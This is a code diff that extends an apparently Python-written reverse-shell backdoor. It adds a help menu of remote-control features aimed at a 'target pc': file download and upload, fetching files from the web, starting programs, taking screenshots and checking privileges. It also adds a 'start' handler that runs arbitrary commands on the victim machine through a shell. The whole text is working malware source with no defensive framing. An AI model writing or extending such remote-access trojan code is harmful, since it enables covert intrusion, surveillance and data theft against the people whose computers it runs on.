@@ -58,6 +58,17 @@ def shell():
         command = reliable_recv()
         if command == 'q':
             break
+        elif command == "help":
+            help_options = '''
+            download path --> Download a file from target pc
+            upload --> Upload a file to target pc
+            get url --> Download a file to target pc from any website
+            start path --> Srart a program on target pc
+            screenshot --> take a screenshot of targets monitor
+            check --> check privileges
+            q --> Exit reverse shell
+            '''
+            reliable_send(help_options)
         elif command[:2] == "cd" and len(command) > 1:
             try:
                 os.chdir(command[3:])
@@ -84,6 +95,12 @@ def shell():
                 os.remove("monitor-1.png")
             except:
                 reliable_send("[!!] Failed to take screenshot")
+        elif command[:5] == "start":
+            try:
+                subprocess.Popen(command[6:], shell=True)
+                reliable_send("[+] Started!")
+            except:
+                reliable_send("[!!] Failed to start")
         elif command[:5] == "check":
             try:
                 is_admin()
